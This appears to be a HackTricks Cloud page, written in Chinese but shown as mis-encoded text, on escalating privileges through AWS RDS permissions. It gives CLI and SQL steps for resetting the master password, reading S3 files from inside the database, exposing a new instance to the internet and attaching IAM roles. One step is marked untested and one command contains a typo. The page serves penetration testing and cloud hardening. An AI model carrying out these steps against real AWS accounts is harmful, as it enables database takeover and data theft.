# AWS - RDSç‰¹æƒå‡çº§

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFç‰ˆæœ¬çš„HackTricksï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## RDS - å…³ç³»å‹æ•°æ®åº“æœåŠ¡

æœ‰å…³RDSçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../aws-services/aws-databases/aws-relational-database-rds-enum.md" %}
[aws-relational-database-rds-enum.md](../aws-services/aws-databases/aws-relational-database-rds-enum.md)
{% endcontent-ref %}

### `rds:ModifyDBInstance`

é€šè¿‡è¯¥æƒé™ï¼Œæ”»å‡»è€…å¯ä»¥**ä¿®æ”¹ä¸»ç”¨æˆ·çš„å¯†ç **å’Œæ•°æ®åº“ä¸­çš„ç™»å½•ä¿¡æ¯ï¼š
```bash
# Get the DB username, db name and address
aws rds describe-db-instances

# Modify the password and wait a couple of minutes
aws rds modify-db-instance \
--db-instance-identifier <db-id> \
--master-user-password 'Llaody2f6.123' \
--apply-immediately

# In case of postgres
psql postgresql://<username>:<pass>@<rds-dns>:5432/<db-name>
```
{% hint style="warning" %}
æ‚¨éœ€è¦èƒ½å¤Ÿ**è¿æ¥åˆ°æ•°æ®åº“**ï¼ˆå®ƒä»¬é€šå¸¸åªèƒ½ä»å†…éƒ¨ç½‘ç»œè®¿é—®ï¼‰ã€‚
{% endhint %}

**æ½œåœ¨å½±å“ï¼š**åœ¨æ•°æ®åº“ä¸­æ‰¾åˆ°æ•æ„Ÿä¿¡æ¯ã€‚

### rds-db:connect

æ ¹æ®[**æ–‡æ¡£**](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/UsingWithRDS.IAMDBAuth.IAMPolicy.html)ï¼Œå…·æœ‰æ­¤æƒé™çš„ç”¨æˆ·å¯ä»¥è¿æ¥åˆ°DBå®ä¾‹ã€‚

### æ»¥ç”¨RDSè§’è‰²IAMæƒé™

#### Postgresqlï¼ˆAuroraï¼‰

{% hint style="success" %}
å¦‚æœè¿è¡Œ**`SELECT datname FROM pg_database;`**ï¼Œæ‚¨å‘ç°ä¸€ä¸ªåä¸º**`rdsadmin`**çš„æ•°æ®åº“ï¼Œé‚£ä¹ˆæ‚¨çŸ¥é“æ‚¨åœ¨**AWS postgresqlæ•°æ®åº“**å†…éƒ¨ã€‚
{% endhint %}

é¦–å…ˆï¼Œæ‚¨å¯ä»¥æ£€æŸ¥æ­¤æ•°æ®åº“æ˜¯å¦å·²ç”¨äºè®¿é—®ä»»ä½•å…¶ä»–AWSæœåŠ¡ã€‚æ‚¨å¯ä»¥é€šè¿‡æŸ¥çœ‹å·²å®‰è£…çš„æ‰©å±•æ¥è¿›è¡Œæ£€æŸ¥ï¼š
```sql
SELECT * FROM pg_extension;
```
å¦‚æœä½ å‘ç°ç±»ä¼¼äº**`aws_s3`**çš„ä¸œè¥¿ï¼Œä½ å¯ä»¥å‡è®¾è¿™ä¸ªæ•°æ®åº“å¯¹S3æœ‰**æŸç§è®¿é—®æƒé™**ï¼ˆè¿˜æœ‰å…¶ä»–æ‰©å±•åï¼Œæ¯”å¦‚**`aws_ml`**å’Œ**`aws_lambda`**ï¼‰ã€‚

æ­¤å¤–ï¼Œå¦‚æœä½ æœ‰æƒé™è¿è¡Œ**`aws rds describe-db-clusters`**ï¼Œä½ å¯ä»¥åœ¨**`AssociatedRoles`**å­—æ®µä¸­æŸ¥çœ‹é›†ç¾¤æ˜¯å¦é™„åŠ äº†ä»»ä½•IAMè§’è‰²ã€‚å¦‚æœæœ‰çš„è¯ï¼Œä½ å¯ä»¥å‡è®¾è¯¥æ•°æ®åº“å·²ç»**å‡†å¤‡å¥½è®¿é—®å…¶ä»–AWSæœåŠ¡**ã€‚æ ¹æ®è§’è‰²çš„**åç§°**ï¼ˆæˆ–è€…å¦‚æœä½ å¯ä»¥è·å–è§’è‰²çš„**æƒé™**ï¼‰ï¼Œä½ å¯ä»¥**çŒœæµ‹**æ•°æ®åº“å…·æœ‰çš„é¢å¤–è®¿é—®æƒé™ã€‚

ç°åœ¨ï¼Œè¦**è¯»å–å­˜å‚¨æ¡¶ä¸­çš„æ–‡ä»¶**ï¼Œä½ éœ€è¦çŸ¥é“å®Œæ•´çš„è·¯å¾„ã€‚ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥è¯»å–å®ƒï¼š
```sql
// Create table
CREATE TABLE ttemp (col TEXT);

// Create s3 uri
SELECT aws_commons.create_s3_uri(
'test1234567890678', // Name of the bucket
'data.csv',          // Name of the file
'eu-west-1'          //region of the bucket
) AS s3_uri \gset

// Load file contents in table
SELECT aws_s3.table_import_from_s3('ttemp', '', '(format text)',:'s3_uri');

// Get info
SELECT * from ttemp;

// Delete table
DROP TABLE ttemp;
```
å¦‚æœæ‚¨æ‹¥æœ‰**åŸå§‹çš„AWSå‡­è¯**ï¼Œæ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨å®ƒä»¬è®¿é—®S3æ•°æ®ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š
```sql
SELECT aws_s3.table_import_from_s3(
't', '', '(format csv)',
:'s3_uri',
aws_commons.create_aws_credentials('sample_access_key', 'sample_secret_key', '')
);
```
{% hint style="info" %}
Postgresql **ä¸éœ€è¦æ›´æ”¹ä»»ä½•å‚æ•°ç»„å˜é‡**å°±èƒ½å¤Ÿè®¿é—®S3ã€‚
{% endhint %}

#### Mysql (Aurora)

{% hint style="success" %}
åœ¨mysqlä¸­ï¼Œå¦‚æœè¿è¡ŒæŸ¥è¯¢ **`SELECT User, Host FROM mysql.user;`** å¹¶ä¸”å­˜åœ¨ä¸€ä¸ªåä¸º **`rdsadmin`** çš„ç”¨æˆ·ï¼Œé‚£ä¹ˆå¯ä»¥å‡è®¾ä½ åœ¨ **AWS RDS mysql db** ä¸­ã€‚
{% endhint %}

åœ¨mysqlä¸­è¿è¡Œ **`show variables;`**ï¼Œå¦‚æœå˜é‡å¦‚ **`aws_default_s3_role`**ã€**`aurora_load_from_s3_role`**ã€**`aurora_select_into_s3_role`** ç­‰å…·æœ‰å€¼ï¼Œé‚£ä¹ˆå¯ä»¥å‡è®¾æ•°æ®åº“å·²å‡†å¤‡å¥½è®¿é—®S3æ•°æ®ã€‚

æ­¤å¤–ï¼Œå¦‚æœä½ æœ‰æƒé™è¿è¡Œ **`aws rds describe-db-clusters`**ï¼Œä½ å¯ä»¥æ£€æŸ¥é›†ç¾¤æ˜¯å¦æœ‰ä»»ä½•**å…³è”è§’è‰²**ï¼Œé€šå¸¸æ„å‘³ç€å¯ä»¥è®¿é—®AWSæœåŠ¡ã€‚

ç°åœ¨ï¼Œè¦**è¯»å–å­˜å‚¨æ¡¶ä¸­çš„æ–‡ä»¶**ï¼Œä½ éœ€è¦çŸ¥é“å®Œæ•´çš„è·¯å¾„ã€‚ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¯»å–ï¼š
```sql
CREATE TABLE ttemp (col TEXT);
LOAD DATA FROM S3 's3://mybucket/data.txt' INTO TABLE ttemp(col);
SELECT * FROM ttemp;
DROP TABLE ttemp;
```
### `rds:AddRoleToDBCluster`, `iam:PassRole`

å…·æœ‰`rds:AddRoleToDBCluster`å’Œ`iam:PassRole`æƒé™çš„æ”»å‡»è€…å¯ä»¥å°†æŒ‡å®šçš„è§’è‰²æ·»åŠ åˆ°ç°æœ‰çš„RDSå®ä¾‹ä¸­ã€‚è¿™å¯èƒ½å…è®¸æ”»å‡»è€…è®¿é—®æ•æ„Ÿæ•°æ®æˆ–ä¿®æ”¹å®ä¾‹ä¸­çš„æ•°æ®ã€‚
```bash
aws add-role-to-db-cluster --db-cluster-identifier <value> --role-arn <value>
```
**æ½œåœ¨å½±å“**ï¼šè®¿é—®RDSå®ä¾‹ä¸­çš„æ•æ„Ÿæ•°æ®æˆ–æœªç»æˆæƒçš„æ•°æ®ä¿®æ”¹ã€‚è¯·æ³¨æ„ï¼ŒæŸäº›æ•°æ®åº“éœ€è¦é¢å¤–çš„é…ç½®ï¼Œä¾‹å¦‚Mysqlï¼Œéœ€è¦åœ¨å‚æ•°ç»„ä¸­æŒ‡å®šè§’è‰²ARNã€‚

### `rds:CreateDBInstance`

ä»…å‡­æ­¤æƒé™ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨å·²å­˜åœ¨å¹¶é™„åŠ äº†IAMè§’è‰²çš„é›†ç¾¤ä¸­åˆ›å»ºä¸€ä¸ª**æ–°å®ä¾‹**ã€‚ä»–å°†æ— æ³•æ›´æ”¹ä¸»ç”¨æˆ·å¯†ç ï¼Œä½†å¯èƒ½èƒ½å¤Ÿå°†æ–°çš„æ•°æ®åº“å®ä¾‹æš´éœ²ç»™äº’è”ç½‘ï¼š
```bash
aws --region eu-west-1 --profile none-priv rds create-db-instance \
--db-instance-identifier mydbinstance2 \
--db-instance-class db.t3.medium \
--engine aurora-postgresql \
--db-cluster-identifier database-1 \
--db-security-groups "string" \
--publicly-accessible
```
### `rds:CreateDBInstance`, `iam:PassRole`

{% hint style="info" %}
å¾…åŠäº‹é¡¹ï¼šæµ‹è¯•
{% endhint %}

æ‹¥æœ‰`rds:CreateDBInstance`å’Œ`iam:PassRole`æƒé™çš„æ”»å‡»è€…å¯ä»¥**åˆ›å»ºä¸€ä¸ªæ–°çš„RDSå®ä¾‹ï¼Œå¹¶é™„åŠ æŒ‡å®šçš„è§’è‰²**ã€‚æ”»å‡»è€…éšåå¯èƒ½å¯ä»¥**è®¿é—®æ•æ„Ÿæ•°æ®**æˆ–ä¿®æ”¹å®ä¾‹ä¸­çš„æ•°æ®ã€‚

{% hint style="warning" %}
é™„åŠ è§’è‰²/å®ä¾‹é…ç½®çš„ä¸€äº›è¦æ±‚ï¼ˆæ¥è‡ª[**è¿™é‡Œ**](https://docs.aws.amazon.com/cli/latest/reference/rds/create-db-instance.html)ï¼‰ï¼š

* è¯¥é…ç½®æ–‡ä»¶å¿…é¡»å­˜åœ¨äºæ‚¨çš„è´¦æˆ·ä¸­ã€‚
* è¯¥é…ç½®æ–‡ä»¶å¿…é¡»å…·æœ‰Amazon EC2æœ‰æƒé™æ‰¿æ‹…çš„IAMè§’è‰²ã€‚
* å®ä¾‹é…ç½®æ–‡ä»¶åç§°å’Œå…³è”çš„IAMè§’è‰²åç§°å¿…é¡»ä»¥å‰ç¼€`AWSRDSCustom`å¼€å¤´ã€‚
{% endhint %}

{% code overflow="wrap" %}
```bash
aws rds create-db-instance --db-instance-identifier malicious-instance --db-instance-class db.t2.micro --engine mysql --allocated-storage 20 --master-username admin --master-user-password mypassword --db-name mydatabase --vapc-security-group-ids sg-12345678 --db-subnet-group-name mydbsubnetgroup --enable-iam-database-authentication --custom-iam-instance-profile arn:aws:iam::123456789012:role/MyRDSEnabledRole
```
{% endcode %}

**æ½œåœ¨å½±å“**ï¼šè®¿é—®RDSå®ä¾‹ä¸­çš„æ•æ„Ÿæ•°æ®æˆ–æœªç»æˆæƒçš„æ•°æ®ä¿®æ”¹ã€‚

### `rds:AddRoleToDBInstance`ï¼Œ`iam:PassRole`

æ‹¥æœ‰`rds:AddRoleToDBInstance`å’Œ`iam:PassRole`æƒé™çš„æ”»å‡»è€…å¯ä»¥**å°†æŒ‡å®šè§’è‰²æ·»åŠ åˆ°ç°æœ‰çš„RDSå®ä¾‹**ã€‚è¿™å¯èƒ½å…è®¸æ”»å‡»è€…**è®¿é—®æ•æ„Ÿæ•°æ®**æˆ–ä¿®æ”¹å®ä¾‹ä¸­çš„æ•°æ®ã€‚

{% hint style="warning" %}
æ­¤æ“ä½œä»…é€‚ç”¨äºä¸åœ¨é›†ç¾¤ä¸­çš„DBå®ä¾‹
{% endhint %}

{% code overflow="wrap" %}
```bash
aws rds add-role-to-db-instance --db-instance-identifier target-instance --role-arn arn:aws:iam::123456789012:role/MyRDSEnabledRole --feature-name <feat-name>
```
{% endcode %}

**æ½œåœ¨å½±å“**ï¼šè®¿é—®RDSå®ä¾‹ä¸­çš„æ•æ„Ÿæ•°æ®æˆ–æœªç»æˆæƒçš„æ•°æ®ä¿®æ”¹ã€‚

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricksï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
